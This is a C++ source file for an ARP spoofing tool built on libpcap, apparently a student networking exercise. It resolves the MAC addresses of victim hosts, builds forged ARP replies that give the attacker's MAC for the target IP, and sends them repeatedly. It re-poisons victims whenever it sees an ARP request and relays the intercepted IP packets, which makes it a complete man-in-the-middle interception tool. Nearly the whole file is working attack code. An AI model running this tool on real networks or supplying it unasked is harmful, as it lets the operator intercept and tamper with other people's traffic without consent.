#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "EthArpPacket.h"
#include "EthTcpPacket.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <vector>
#include <iostream>
#include<time.h>
#define RELAY 1
#define INFECT 2
using namespace std;
#pragma pack(push, 1)
struct Spoof final{
    Spoof(){}
    Spoof(Ip sip, Ip tip,Mac smac, Mac tmac,EthArpPacket pckt){
		sip_=sip; tip_=tip; tmac_=tmac; smac_=smac; infctpckt=pckt; 
	}
public:
	Ip sip_;
    Ip tip_;
	Mac tmac_;
	Mac smac_;
    EthArpPacket infctpckt;
};
#pragma pack(pop)
Spoof spoofarr[40];
int idx=0;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}
Mac getmymac(struct ifreq ifr){
	Mac mymac=Mac(ifr.ifr_hwaddr); //using overloaded constructor
	return mymac;
}
Ip getmyip(struct ifreq ifr){
	Ip myip=Ip(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr); //using overloaded constructor
	return myip;
}
Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
	EthArpPacket packet;
	const u_char* rawpacket;
	//constructing arp request packet: 'who is sip??'
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//broadcast
	packet.eth_.smac_ = mmac;//mac of mine
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = mmac;//mac of mine
	packet.arp_.sip_ = htonl(mip);//ip of mine
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //not defined
	packet.arp_.tip_ = htonl(sip);//ip of sender : target
	//send arp request
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while(1){
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		memcpy(&packet,rawpacket,sizeof(EthArpPacket)); //recive pckt pointer 
		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){//if received packet is Arpreply and ip check
			Mac resultmac=packet.arp_.smac_;
			return resultmac;
		}
    }
}
void Relay(pcap_t* handle, const u_char* packet){
	int flag=0;
	EthHdr* ethinfo=(EthHdr*)packet;
	IpHdr* ipinfo=(IpHdr*)(packet+14);
	int size=14+ntohs(ipinfo->ip_len);
	 //string(ethinfo->smac_)<<" to "<<string(ethinfo->dmac_)<<" received"
	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
	memcpy(relaypacket, packet, sizeof(char)*size);
	EthHdr* ethhdr=(EthHdr*)relaypacket;
	IpHdr* iphdr=(IpHdr*)(relaypacket+14);
	Ip dip=Ip(ntohl((uint32_t)iphdr->ip_src));
	for(int i=0; i<idx; i++){
		if(spoofarr[i].smac_==ethhdr->smac_){
			flag=1;
			ethhdr->smac_=ethhdr->dmac_;
			ethhdr->dmac_=spoofarr[i].tmac_;
			break;
		}
	}
	if(flag==1){
		printf("-\n");
		pcap_sendpacket(handle, relaypacket, size);
	}	
}
void SendInfectFlood(pcap_t* handle){
	for(int i=0; i<idx; i++){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
	}
}
void SendInfect(pcap_t* handle, Ip sip){
	for(int i=0; i<idx; i++){
		if(spoofarr[i].sip_==sip){
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			return;
		}
	}
}
int parsing(const u_char* packet, Ip mip){
	EthHdr* ethhdr=(EthHdr*)packet;
	if(ntohs(ethhdr->type_)==EthHdr::Arp){
		ArpHdr* arphdr=(ArpHdr*)(packet+14);
		if(ntohl(arphdr->sip_)==(uint32_t)mip)
			return -1;
		else if(arphdr->op_==ArpHdr::Request)
			return INFECT;
	}
	else {
		IpHdr* iphdr=(IpHdr*)(packet+14);
		Ip dip=ntohl(iphdr->ip_dst);
		if(dip==mip)
			return -1;
		for(int i=0; i<idx; i++){
			if(ethhdr->smac_==spoofarr[i].smac_)
				return RELAY;
		}
	}
	return -1;
}
void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
	EthArpPacket packet;
	Mac smac=getmac(handle,myip,senderip,mmac);
	Mac tmac=getmac(handle,myip,targetip,mmac);
	packet.eth_.dmac_ = smac;//mac of sender
	packet.eth_.smac_ = mmac;//mac of mine(attacker)
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = mmac;//mac of mine(attacker)
	packet.arp_.sip_ = htonl(targetip);//ip of target
	packet.arp_.tmac_ = smac;//mac of sender
	packet.arp_.tip_ = htonl(senderip);//ip of sender
	Spoof result=Spoof(senderip, targetip, smac, tmac, packet);
	memcpy(&spoofarr[idx++],&result,sizeof(Spoof));
}
int main(int argc, char* argv[]) {
	if (argc %2==1) {
		usage();
		return -1;
	}
	int len=(argc-2)/2;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //read_timeout 10
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	const u_char* rawpacket;
	EthArpPacket packet;
	EthTcpPacket* tcppacket;
	EthArpPacket* arppacket;
	///using ioctl & ifreq to get device information
	int sock;
	struct ifreq ifr;
	struct ifreq ifr_ip;
	memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
	memset(&ifr_ip, 0x00, sizeof(ifr));
    strcpy(ifr_ip.ifr_name, dev);
 	ifr_ip.ifr_addr.sa_family = AF_INET;

    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
        perror("socket ");
    }
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl mac");
        exit(1);
    }
	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
        perror("ioctl ip");
        exit(1);
    }
	close(sock);
	///
	Ip myip=getmyip(ifr_ip);
	Mac mmac=getmymac(ifr);
	printf("[info] collect my ip mac completed\n");
	for(int i=0; i<len; i++){
		printf("[info] init\n");
		init(handle, Ip(argv[2+i*2]),Ip(argv[3+i*2]),myip, mmac);
	}
	for(int i=0; i<idx; i++){
		printf("sending arp!!...\n");
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	int res;
	clock_t start=clock();
	while(1){
		clock_t end=clock();
		if((end - start)>20000){
			printf("flooding...\n");
			SendInfectFlood(handle);
			start=end;
		}
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		res=parsing(rawpacket, myip);
		switch (res)
		{
		case INFECT:
			printf("sending arp...\n");
			arppacket=(EthArpPacket*)rawpacket;
			SendInfect(handle, arppacket->arp_.sip_);
			break;
		case RELAY:
			Relay(handle, rawpacket);
		default:
			break;
		}
    }
	pcap_close(handle);
}
